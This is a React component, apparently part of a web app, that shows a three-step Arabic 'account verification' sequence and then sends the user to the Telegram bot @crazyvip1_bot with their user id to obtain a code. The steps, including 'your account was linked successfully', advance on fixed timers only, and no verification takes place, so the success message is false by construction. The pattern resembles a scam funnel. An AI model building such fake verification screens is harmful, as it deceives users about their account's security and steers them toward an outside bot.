import { useEffect, useState } from "react";
import { Check, Loader2, Send } from "lucide-react";
import { Overlay } from "@/components/Overlay";
import { markAwaitingCode, readUserId } from "@/lib/session";

const BOT = "crazyvip1_bot";

const STEPS = ["يتم التحقق من حسابك", "جار ربط حسابك بالمنصة", "تم ربط حسابك بنجاح"];

export function VerifySequenceDialog({ open, onClose }: { open: boolean; onClose: () => void }) {
  const [stage, setStage] = useState(0);

  useEffect(() => {
    if (!open) {
      setStage(0);
      return;
    }
    const t1 = setTimeout(() => setStage(1), 1600);
    const t2 = setTimeout(() => setStage(2), 3200);
    const t3 = setTimeout(() => setStage(3), 4600);
    return () => {
      clearTimeout(t1);
      clearTimeout(t2);
      clearTimeout(t3);
    };
  }, [open]);

  const uid = typeof window !== "undefined" ? readUserId() : "";
  const link = `https://t.me/${BOT}?start=${encodeURIComponent(uid || "user")}`;

  return (
    <Overlay open={open} onClose={stage >= 3 ? onClose : undefined}>
      <ul className="flex flex-col gap-3">
        {STEPS.map((s, i) => {
          const state = stage > i ? "done" : stage === i ? "active" : "idle";
          return (
            <li
              key={s}
              className={`flex items-center gap-3 rounded-xl border p-3 transition ${
                state === "idle"
                  ? "border-white/10 opacity-40"
                  : state === "active"
                    ? "border-primary/60"
                    : "border-primary bg-primary/10"
              }`}
            >
              <span className="flex h-8 w-8 items-center justify-center rounded-lg border border-primary/40 text-primary">
                {state === "done" ? (
                  <Check className="h-4 w-4" />
                ) : state === "active" ? (
                  <Loader2 className="h-4 w-4 animate-spin" />
                ) : (
                  <span className="text-[11px] font-black">{i + 1}</span>
                )}
              </span>
              <span className="text-sm font-bold text-foreground">{s}</span>
            </li>
          );
        })}
      </ul>

      {stage >= 3 && (
        <div className="mt-5 animate-fade-in rounded-2xl border border-primary/40 p-4 text-center">
          <p className="text-[11px] uppercase tracking-[0.25em] text-muted-foreground">telegram bot</p>
          <p className="mt-1 text-lg font-black text-primary">@{BOT}</p>
          <a
            href={link}
            onClick={() => markAwaitingCode()}
            target="_blank"
            rel="noreferrer"
            className="mt-4 flex w-full items-center justify-center gap-2 rounded-xl py-3 text-sm font-black text-black transition active:scale-95"
            style={{ backgroundColor: "#90D600", boxShadow: "0 0 24px rgba(144,214,0,0.45)" }}
          >
            <Send className="h-4 w-4" /> الحصول على الكود
          </a>
        </div>
      )}
    </Overlay>
  );
}
